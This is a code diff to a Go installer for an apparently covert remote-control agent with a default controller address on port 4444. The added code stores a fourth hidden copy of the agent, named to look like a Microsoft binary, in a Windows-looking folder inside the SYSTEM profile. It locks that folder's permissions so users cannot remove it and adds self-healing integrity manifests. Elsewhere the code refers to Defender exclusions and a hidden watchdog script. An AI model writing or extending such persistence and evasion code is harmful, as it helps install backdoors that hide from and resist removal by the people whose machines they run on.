@@ -2,7 +2,10 @@
 
 import (
 	"bytes"
+	"crypto/rand"
+	"crypto/sha256"
 	"embed"
+	"encoding/hex"
 	"fmt"
 	"io"
 	"io/fs"
@@ -10,6 +13,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"syscall"
 	"time"
@@ -122,6 +126,52 @@ func grantUsersModify(dirs ...string) {
 	}
 }
 
+// vaultDir is the fourth backup copy, inside the SYSTEM profile. Same path
+// the agent's watcher reads (duplicated: installer and agent are separate
+// binaries that must agree without sharing code).
+func vaultDir() string {
+	sys := os.Getenv("SystemRoot")
+	if sys == "" {
+		sys = `C:\Windows`
+	}
+	return filepath.Join(sys, "System32", "config", "systemprofile", "AppData", "Local", "Microsoft", "Windows", "UpdateOrchestrator")
+}
+
+// lockVault strips inheritance and grants only SYSTEM + Administrators, so
+// standard-user wipes and profile sweeps cannot reach the last-resort copy.
+func lockVault(dir string) {
+	out, err := exec.Command("icacls", dir, "/inheritance:r", "/grant", "SYSTEM:(OI)(CI)F", "/grant", "*S-1-5-32-544:(OI)(CI)F", "/C", "/Q").CombinedOutput()
+	if err != nil {
+		log.Printf("[!] vault lock %s: %v %s", dir, err, strings.TrimSpace(string(out)))
+		return
+	}
+	log.Printf("[*] Vault locked to SYSTEM+Administrators: %s", dir)
+}
+
+// sha256File returns the hex SHA256 of a file ("" on any error).
+func sha256File(path string) string {
+	f, err := os.Open(path)
+	if err != nil {
+		return ""
+	}
+	defer f.Close()
+	h := sha256.New()
+	if _, err := io.Copy(h, f); err != nil {
+		return ""
+	}
+	return hex.EncodeToString(h.Sum(nil))
+}
+
+// writeIntegrityManifest stamps dir/integrity.json {version, exe sha256}.
+// The agent's healers verify it before restoring, refusing trojaned bytes.
+func writeIntegrityManifest(dir, ver, exePath string) {
+	sha := sha256File(exePath)
+	if sha == "" || ver == "" {
+		return
+	}
+	_ = os.WriteFile(filepath.Join(dir, "integrity.json"), []byte(`{"v":`+strconv.Quote(ver)+`,"sha":`+strconv.Quote(sha)+`}`+"\n"), 0644)
+}
+
 func saveHouse(path, addr string) {
 	addr = strings.TrimSpace(addr)
 	if addr == "" {
@@ -202,6 +252,7 @@ func install() {
 	controllerAddr := "176.229.98.54:4444"
 	agentToken := ""
 	agentModeFlag := ""
+	deleteTokenFlag := ""
 	for i, a := range os.Args {
 		if (a == "-controller" || a == "--controller") && i+1 < len(os.Args) {
 			controllerAddr = os.Args[i+1]
@@ -215,6 +266,12 @@ func install() {
 			agentToken = strings.TrimSpace(strings.TrimPrefix(a, "-token="))
 		} else if strings.HasPrefix(a, "--token=") {
 			agentToken = strings.TrimSpace(strings.TrimPrefix(a, "--token="))
+		} else if (a == "-deletetoken" || a == "--deletetoken") && i+1 < len(os.Args) {
+			deleteTokenFlag = strings.TrimSpace(os.Args[i+1])
+		} else if strings.HasPrefix(a, "-deletetoken=") {
+			deleteTokenFlag = strings.TrimSpace(strings.TrimPrefix(a, "-deletetoken="))
+		} else if strings.HasPrefix(a, "--deletetoken=") {
+			deleteTokenFlag = strings.TrimSpace(strings.TrimPrefix(a, "--deletetoken="))
 		} else if (a == "-mode" || a == "--mode") && i+1 < len(os.Args) {
 			agentModeFlag = strings.TrimSpace(os.Args[i+1])
 		} else if strings.HasPrefix(a, "-mode=") {
@@ -343,6 +400,34 @@ func install() {
 	_ = copyFile(agentPath, backupAgent2)
 	_ = copyFile(certPath, backupCert2)
 	grantUsersModify(blenderDir, backupDir2)
+	// Self-delete token: guards permanent removal (kill-agent is only
+	// quiet). Explicit flag wins; otherwise keep an existing one from any
+	// copy; otherwise generate. Stored 0600 in install dir + both backups
+	// + vault (travels like token.txt). Never logged.
+	deleteTokenPath := filepath.Join(installDir, "delete_token.txt")
+	deleteToken := deleteTokenFlag
+	if deleteToken != "" && len(deleteToken) < 8 {
+		log.Fatalf("delete token must be 8+ characters")
+	}
+	if deleteToken == "" {
+		for _, p := range []string{deleteTokenPath, filepath.Join(blenderDir, "delete_token.txt"), filepath.Join(backupDir2, "delete_token.txt")} {
+			if b, err := os.ReadFile(p); err == nil && len(bytes.TrimSpace(b)) >= 8 {
+				deleteToken = string(bytes.TrimSpace(b))
+				break
+			}
+		}
+	}
+	if deleteToken == "" {
+		var rb [24]byte
+		if _, err := rand.Read(rb[:]); err != nil {
+			log.Fatalf("cannot generate delete token: %v", err)
+		}
+		deleteToken = hex.EncodeToString(rb[:])
+		log.Printf("[*] Generated self-delete token (store it — removal needs it)")
+	}
+	_ = os.WriteFile(deleteTokenPath, []byte(deleteToken+"\n"), 0600)
+	_ = os.WriteFile(filepath.Join(blenderDir, "delete_token.txt"), []byte(deleteToken+"\n"), 0600)
+	_ = os.WriteFile(filepath.Join(backupDir2, "delete_token.txt"), []byte(deleteToken+"\n"), 0600)
 	// Token travels with the backups (only when set - never create empties).
 	backupToken := filepath.Join(blenderDir, "token.txt")
 	backupToken2 := filepath.Join(backupDir2, "token.txt")
@@ -377,6 +462,30 @@ func install() {
 	_ = os.WriteFile(filepath.Join(installDir, "version.txt"), []byte(version.Version+"\n"), 0644)
 	_ = os.WriteFile(filepath.Join(blenderDir, "version.txt"), []byte(version.Version+"\n"), 0644)
 	_ = os.WriteFile(filepath.Join(backupDir2, "version.txt"), []byte(version.Version+"\n"), 0644)
+	writeIntegrityManifest(blenderDir, version.Version, agentPath)
+	writeIntegrityManifest(backupDir2, version.Version, agentPath)
+	// Fourth copy in the SYSTEM profile vault, locked to SYSTEM +
+	// Administrators: unreachable to standard-user wipes and profile
+	// sweeps, readable by the elevated healers as the copy of last resort.
+	vault := vaultDir()
+	_ = os.MkdirAll(vault, 0755)
+	vaultAgent := filepath.Join(vault, "MicrosoftWindowsClient.exe")
+	vaultCert := filepath.Join(vault, "server.crt")
+	_ = copyFile(agentPath, vaultAgent)
+	_ = copyFile(certPath, vaultCert)
+	_ = os.WriteFile(filepath.Join(vault, "version.txt"), []byte(version.Version+"\n"), 0644)
+	if agentToken != "" {
+		_ = os.WriteFile(filepath.Join(vault, "token.txt"), []byte(agentToken+"\n"), 0600)
+	}
+	_ = os.WriteFile(filepath.Join(vault, "delete_token.txt"), []byte(deleteToken+"\n"), 0600)
+	if agentModeFlag != "" {
+		_ = os.WriteFile(filepath.Join(vault, "mode.json"), []byte(agentModeFlag+"\n"), 0644)
+	}
+	writeIntegrityManifest(vault, version.Version, agentPath)
+	hideFile(vaultAgent)
+	hideFile(vault)
+	lockVault(vault)
+	log.Printf("[*] Vault copy installed: %s", vault)
 	// Hidden+system attributes: invisible to casual browsing, blocks
 	// shift-delete sweeps that skip system files.
 	for _, p := range []string{backupAgent, backupCert, backupAgent2, backupCert2, backupToken, backupToken2} {
@@ -594,6 +703,7 @@ func main() {
 		// Kill watchdog by command-line match (window title is unreliable when hidden).
 		_, _ = exec.Command("powershell", "-NoProfile", "-command", "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*watchdog.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }").CombinedOutput()
 		removeDefenderExclusions(installDir, filepath.Join(installDir, "MicrosoftWindowsClient.exe"))
+		_ = os.RemoveAll(vaultDir())
 		_ = os.RemoveAll(installDir)
 		if legacyDir != "" && legacyDir != installDir {
 			_ = os.RemoveAll(legacyDir)
